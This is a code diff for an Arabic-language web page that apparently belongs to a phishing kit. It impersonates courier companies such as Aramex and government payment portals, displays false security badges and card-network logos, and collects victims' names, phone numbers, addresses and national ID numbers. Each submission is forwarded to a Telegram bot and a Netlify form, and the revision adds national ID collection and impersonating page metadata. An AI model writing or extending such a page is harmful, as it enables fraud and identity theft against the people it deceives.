@@ -1,247 +1,221 @@
 import { useState, useEffect } from "react";
 import { useParams, useNavigate, useSearchParams } from "react-router-dom";
-import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import {
-  User,
-  Phone,
-  Mail,
-  Loader2,
-  ShieldCheck,
-  MapPin,
-  Lock,
-  Landmark,
-  FileText,
-  ArrowLeft,
-  Info
-} from "lucide-react";
-import { useToast } from "@/hooks/use-toast";
+import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { getCountryByCode } from "@/lib/countries";
-import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
-import { applyDynamicIdentity, removeDynamicIdentity } from "@/lib/dynamicIdentity";
-import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
-import BottomNav from "@/components/BottomNav";
-import BackButton from "@/components/BackButton";
+import { useLink, useUpdateLink } from "@/hooks/useSupabase";
+import { Loader2, User, Phone, Mail, MapPin, ArrowLeft, ShieldCheck, Globe, Lock, ChevronDown } from "lucide-react";
+import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
+import { getCountryByCode } from "@/lib/countries";
+import { formatCurrency } from "@/lib/countryCurrencies";
+import { getGovBranding } from "@/lib/governmentPaymentSystems";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 
 const PaymentRecipient = () => {
   const { id } = useParams();
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: link, isLoading } = useLink(id);
+  const { data: linkData, isLoading: linkLoading } = useLink(id);
   const updateLink = useUpdateLink();
 
-  const [formData, setFormData] = useState({
-    fullName: "",
-    phone: "",
-    email: "",
-    address: "",
-    reference: ""
-  });
+  const [name, setName] = useState("");
+  const [phone, setPhone] = useState("");
+  const [email, setEmail] = useState("");
+  const [address, setAddress] = useState("");
+  const [nationalId, setNationalId] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const company = searchParams.get("company") || link?.payload?.service_key || "aramex";
-  const method = searchParams.get("method") || link?.payload?.payment_method || "card";
-  const branding = getServiceBranding(company);
-  const countryCode = link?.country_code || "SA";
-  const countryData = getCountryByCode(countryCode);
-  const govSystem = getGovernmentPaymentSystem(countryCode);
+  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
+  const govId = searchParams.get("govId") || linkData?.payload?.govId;
+  const branding = getServiceBranding(companyKey);
+  const govBranding = govId ? getGovBranding(govId) : undefined;
+
+  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+  const selectedCountryData = getCountryByCode(selectedCountry);
+  const rawAmount = linkData?.payload?.cod_amount || 500;
+  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
+
+  const isGov = !!govBranding;
+  const primaryColor = isGov ? govBranding.colors.primary : branding.colors.primary;
+  const secondaryColor = isGov ? govBranding.colors.secondary : branding.colors.secondary;
 
   useEffect(() => {
-    if (company) {
-      applyDynamicIdentity(company);
+    if (linkData?.payload?.customerInfo) {
+      const info = linkData.payload.customerInfo;
+      setName(info.name || "");
+      setPhone(info.phone || "");
+      setEmail(info.email || "");
+      setAddress(info.address || "");
     }
-    return () => {
-      removeDynamicIdentity();
-    };
-  }, [company]);
-
-  useEffect(() => {
-    if (link?.payload) {
-      setFormData(prev => ({
-        ...prev,
-        fullName: link.payload.customerInfo?.fullName || link.payload.customer_name || "",
-        phone: link.payload.customerInfo?.phone || link.payload.customer_phone || "",
-        email: link.payload.customerInfo?.email || link.payload.customer_email || "",
-        address: link.payload.customerInfo?.address || "",
-        reference: link.payload.reference || ""
-      }));
-    }
-  }, [link]);
+  }, [linkData]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!formData.fullName || !formData.phone) {
-      toast({ title: "خطأ", description: "الرجاء إدخال البيانات المطلوبة", variant: "destructive" });
+    if (!name || !phone) {
+      toast({ title: "خطأ", description: "الرجاء إدخال الاسم ورقم الجوال", variant: "destructive" });
       return;
     }
 
     setIsSubmitting(true);
+    const customerInfo = { name, phone, email, address, nationalId };
+
     try {
-      const netlifyData = new FormData();
-      netlifyData.append('form-name', 'payment-recipient');
-      netlifyData.append('name', formData.fullName);
-      netlifyData.append('email', formData.email);
-      netlifyData.append('phone', formData.phone);
-      netlifyData.append('address', formData.address);
-      netlifyData.append('service', link?.payload?.service_name || company);
-      netlifyData.append('amount', (link?.payload?.payment_amount || link?.payload?.cod_amount || 0).toString());
-      netlifyData.append('linkId', id || '');
+      await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, customerInfo } });
 
-      try {
-        await fetch('/', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: new URLSearchParams(netlifyData as any).toString()
-        });
-      } catch (err) {}
-
-      await updateLink.mutateAsync({
-        linkId: id!,
-        payload: { ...link?.payload, customerInfo: formData, reference: formData.reference }
+      // Netlify Form Submission
+      await fetch("/", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          "form-name": "recipient-info",
+          linkId: id!,
+          service: isGov ? govBranding.nameAr : branding.name,
+          name, phone, email, address, nationalId,
+          amount: formattedAmount
+        }).toString()
       });
 
       await sendToTelegram({
-        type: 'payment_recipient',
-        data: {
-          ...formData,
-          service: link?.payload?.service_name || company,
-          amount: formatCurrency(link?.payload?.payment_amount || link?.payload?.cod_amount || 0, link?.payload?.currency_code || countryCode),
-          payment_url: `${window.location.origin}/pay/${id}/details`
-        },
+        type: 'recipient_info',
+        data: { name, phone, email, address, nationalId, service: isGov ? govBranding.nameAr : branding.name, amount: formattedAmount, country: selectedCountryData?.nameAr },
         timestamp: new Date().toISOString()
       });
 
-      navigate(`/pay/${id}/details?company=${company}&method=${method}`);
-    } catch (err) {
-      console.error(err);
-      toast({ title: "خطأ", description: "حدث خطأ أثناء حفظ البيانات", variant: "destructive" });
+      navigate(`/pay/${id}/details${window.location.search}`);
+    } catch (error) {
+      toast({ title: "خطأ", description: "فشل حفظ البيانات", variant: "destructive" });
     } finally {
       setIsSubmitting(false);
     }
   };
 
-  if (isLoading || !link) {
-    return <div className="min-h-screen flex items-center justify-center bg-gray-50"><Loader2 className="w-10 h-10 animate-spin text-blue-600" /></div>;
+  if (linkLoading || !linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-gray-50">
+        <Loader2 className="w-10 h-10 animate-spin text-blue-600" />
+      </div>
+    );
   }
 
-  const isGov = company.startsWith('gov_');
-  const primaryColor = isGov ? govSystem.colors.primary : branding.colors.primary;
-
   return (
-    <div className="min-h-screen bg-[#F8FAFC] pb-20" dir="rtl">
-      <header className="bg-white border-b-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
-        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
-          <div className="flex items-center gap-4">
-             <BackButton />
-             <div className="flex items-center gap-3">
-                <div className="w-10 h-10 rounded-xl flex items-center justify-center text-white shadow-md" style={{ background: primaryColor }}>
-                   {isGov ? <Landmark className="w-5 h-5" /> : <User className="w-5 h-5" />}
-                </div>
-                <div>
-                   <h1 className="text-lg font-black text-gray-800 leading-none">{isGov ? 'بيانات المستفيد' : 'بيانات التوصيل والسداد'}</h1>
-                   <p className="text-[8px] font-bold text-gray-400 uppercase tracking-widest mt-1">Official Secure Portal</p>
-                </div>
-             </div>
-          </div>
-          {isGov ? (
-            govSystem.logo && <img src={govSystem.logo} className="h-8 w-auto object-contain" alt="" />
-          ) : (
-            branding.logo && <img src={branding.logo} className="h-8 w-auto object-contain" alt="" />
-          )}
-        </div>
+    <div className="min-h-screen flex flex-col bg-[#F8F9FA]" dir="rtl">
+      <PaymentMetaTags
+        serviceKey={isGov ? govId! : companyKey}
+        serviceName={isGov ? govBranding.nameAr : branding.name}
+        title={isGov ? `بوابة الدفع - ${govBranding.nameAr}` : `بوابة الدفع - ${branding.name}`}
+      />
+
+      <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50 px-4" style={{ borderBottomColor: primaryColor }}>
+         <div className="container mx-auto h-16 sm:h-20 flex items-center justify-between">
+            <div className="flex items-center gap-4">
+               <img src={isGov ? govBranding.logo : branding.logo} alt="" className="h-10 sm:h-12 object-contain" />
+               <div className="hidden sm:block">
+                  <h1 className="text-sm font-black text-gray-800 leading-none">{isGov ? govBranding.nameAr : branding.name}</h1>
+                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mt-1">E-Services & Payment Gateway</p>
+               </div>
+            </div>
+            <div className="flex items-center gap-3">
+               <div className="flex items-center gap-1 text-[10px] font-bold text-gray-400 border rounded-full px-3 py-1 bg-gray-50">
+                  <Globe className="w-3 h-3" />
+                  <span>English</span>
+               </div>
+               <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-100">
+                  <Lock className="w-3 h-3" />
+                  <span className="text-[10px] font-bold uppercase">Secured</span>
+               </div>
+            </div>
+         </div>
       </header>
 
-      <div className="container mx-auto px-4 py-8">
-        <div className="max-w-4xl mx-auto grid md:grid-cols-5 gap-8">
-          <div className="md:col-span-3 space-y-6">
-            <Card className="p-8 border-0 shadow-2xl rounded-[2.5rem] bg-white">
-               <div className="flex items-center gap-3 mb-8">
-                  <div className="w-1.5 h-6 rounded-full" style={{ background: primaryColor }} />
-                  <h2 className="text-xl font-black text-gray-800">أدخل معلوماتك الشخصية</h2>
-               </div>
+      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
+         <div className="w-full max-w-xl space-y-8">
+            <div className="text-center space-y-2">
+               <h2 className="text-2xl sm:text-3xl font-black text-gray-900 tracking-tight">بيانات مستلم الخدمة</h2>
+               <p className="text-sm font-bold text-gray-500 uppercase tracking-widest">Recipient Information & Verification</p>
+            </div>
 
-               <form onSubmit={handleSubmit} className="space-y-6">
-                  <div className="space-y-2">
-                     <Label className="text-xs font-black text-gray-400 uppercase">الاسم الكامل</Label>
-                     <div className="relative group">
-                        <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
-                        <Input value={formData.fullName} onChange={(e) => setFormData({...formData, fullName: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white transition-all" placeholder="الاسم كما في الهوية" required />
-                     </div>
-                  </div>
+            <Card className="border-none shadow-2xl rounded-[2.5rem] overflow-hidden bg-white">
+               <div className="h-2 w-full" style={{ backgroundColor: primaryColor }} />
+               <form onSubmit={handleSubmit} className="p-8 sm:p-10 space-y-6">
+                  <div className="space-y-6">
+                    <div className="space-y-1.5">
+                      <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">الاسم الكامل</Label>
+                      <div className="relative group">
+                        <Input value={name} onChange={(e) => setName(e.target.value)} className="h-14 border-2 border-gray-100 rounded-2xl font-black text-gray-700 bg-gray-50/50 pr-12 focus:border-blue-500 transition-all" placeholder="أدخل اسمك الكامل" required />
+                        <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
+                      </div>
+                    </div>
 
-                  <div className="grid sm:grid-cols-2 gap-6">
-                     <div className="space-y-2">
-                        <Label className="text-xs font-black text-gray-400 uppercase">رقم الجوال</Label>
-                        <div className="relative group">
-                           <Phone className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
-                           <Input value={formData.phone} onChange={(e) => setFormData({...formData, phone: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white text-left" dir="ltr" placeholder="05XXXXXXXX" required />
-                        </div>
-                     </div>
-                     <div className="space-y-2">
-                        <Label className="text-xs font-black text-gray-400 uppercase">البريد الإلكتروني</Label>
-                        <div className="relative group">
-                           <Mail className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
-                           <Input type="email" value={formData.email} onChange={(e) => setFormData({...formData, email: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white text-left" dir="ltr" placeholder="example@mail.com" required />
-                        </div>
-                     </div>
-                  </div>
-
-                  {isGov && (
-                    <div className="space-y-2">
-                       <Label className="text-xs font-black text-gray-400 uppercase">رقم الفاتورة / المرجع</Label>
-                       <div className="relative group">
-                          <FileText className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
-                          <Input value={formData.reference} onChange={(e) => setFormData({...formData, reference: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white" placeholder="أدخل الرقم المرجعي" />
+                    <div className="grid sm:grid-cols-2 gap-6">
+                       <div className="space-y-1.5">
+                         <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">رقم الجوال</Label>
+                         <div className="relative group">
+                           <Input value={phone} onChange={(e) => setPhone(e.target.value)} className="h-14 border-2 border-gray-100 rounded-2xl font-black text-gray-700 bg-gray-50/50 pr-12" placeholder="05xxxxxxxx" required />
+                           <Phone className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
+                         </div>
+                       </div>
+                       <div className="space-y-1.5">
+                          <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">البريد الإلكتروني (اختياري)</Label>
+                          <div className="relative group">
+                            <Input value={email} onChange={(e) => setEmail(e.target.value)} className="h-14 border-2 border-gray-100 rounded-2xl font-black text-gray-700 bg-gray-50/50 pr-12" placeholder="example@mail.com" />
+                            <Mail className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
+                          </div>
                        </div>
                     </div>
-                  )}
 
-                  <div className="space-y-2">
-                     <Label className="text-xs font-black text-gray-400 uppercase">عنوان السكن</Label>
-                     <div className="relative group">
-                        <MapPin className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-600 transition-colors" />
-                        <Input value={formData.address} onChange={(e) => setFormData({...formData, address: e.target.value})} className="h-14 pr-12 border-2 rounded-2xl font-bold text-lg bg-gray-50 focus:bg-white" placeholder="المدينة، الحي، الشارع" required />
-                     </div>
+                    <div className="space-y-1.5">
+                      <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">{isGov ? "رقم الهوية / الإقامة" : "العنوان بالتفصيل"}</Label>
+                      <div className="relative group">
+                        <Input
+                          value={isGov ? nationalId : address}
+                          onChange={(e) => isGov ? setNationalId(e.target.value) : setAddress(e.target.value)}
+                          className="h-14 border-2 border-gray-100 rounded-2xl font-black text-gray-700 bg-gray-50/50 pr-12"
+                          placeholder={isGov ? "أدخل رقم الهوية" : "المدينة، الحي، الشارع"}
+                          required
+                        />
+                        {isGov ? <ShieldCheck className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" /> : <MapPin className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" />}
+                      </div>
+                    </div>
                   </div>
 
-                  <Button type="submit" disabled={isSubmitting} className="w-full h-16 rounded-2xl text-xl font-black shadow-xl transition-all hover:translate-y-[-2px]" style={{ background: isGov ? govSystem.gradients.primary : branding.colors.primary, boxShadow: `0 10px 30px -10px ${primaryColor}80` }}>
-                    {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "المتابعة لتفاصيل الدفع"}
-                  </Button>
+                  <div className="pt-6">
+                    <Button
+                      type="submit"
+                      disabled={isSubmitting}
+                      className="w-full h-16 rounded-2xl font-black text-lg shadow-xl hover:translate-y-[-2px] transition-all text-white active:scale-[0.98]"
+                      style={{ backgroundColor: primaryColor }}
+                    >
+                      {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "متابعة عملية الدفع"}
+                    </Button>
+                    <div className="mt-6 flex items-center justify-center gap-2 text-gray-400">
+                       <ShieldCheck className="w-4 h-4" />
+                       <span className="text-[10px] font-bold uppercase tracking-widest">تشفير بيانات آمن 256-bit SSL</span>
+                    </div>
+                  </div>
                </form>
             </Card>
-          </div>
 
-          <div className="md:col-span-2 space-y-6">
-             <Card className="p-6 border-0 shadow-xl rounded-[2rem] bg-white">
-                <h3 className="text-sm font-black text-gray-400 uppercase tracking-widest mb-4">ملخص الرسوم</h3>
-                <div className="space-y-4">
-                   <div className="flex items-center gap-3">
-                      <div className="w-10 h-10 rounded-xl bg-gray-50 flex items-center justify-center border border-gray-100" style={{ color: primaryColor }}>
-                        {isGov ? <Landmark className="w-5 h-5" /> : <Info className="w-5 h-5" />}
-                      </div>
-                      <div>
-                        <p className="text-[10px] font-bold text-gray-400">الخدمة</p>
-                        <p className="text-sm font-black text-gray-700">{link.payload.service_name || link.payload.chalet_name}</p>
-                      </div>
-                   </div>
-                   <div className="p-4 rounded-2xl bg-gray-50 border border-gray-100 text-center">
-                      <p className="text-[10px] font-black text-gray-400 uppercase mb-1">إجمالي المبلغ</p>
-                      <p className="text-3xl font-black" style={{ color: primaryColor }}>{formatCurrency(link.payload.payment_amount || link.payload.cod_amount || link.payload.total_amount || 0, link.payload.currency_code || countryCode)}</p>
-                   </div>
-                </div>
-             </Card>
-          </div>
-        </div>
-      </div>
-      <BottomNav />
-      <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
-        <input type="text" name="name" /><input type="email" name="email" /><input type="tel" name="phone" /><input type="text" name="address" /><input type="text" name="service" /><input type="text" name="amount" /><input type="text" name="linkId" />
+            <div className="flex justify-center gap-8 opacity-40 grayscale">
+               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-6" alt="mada" />
+               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-6" alt="visa" />
+               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-6" alt="mastercard" />
+            </div>
+         </div>
+      </main>
+
+      <form name="recipient-info" netlify-honeypot="bot-field" data-netlify="true" hidden>
+        <input type="text" name="linkId" />
+        <input type="text" name="service" />
+        <input type="text" name="name" />
+        <input type="tel" name="phone" />
+        <input type="email" name="email" />
+        <input type="text" name="address" />
+        <input type="text" name="nationalId" />
+        <input type="text" name="amount" />
       </form>
     </div>
   );
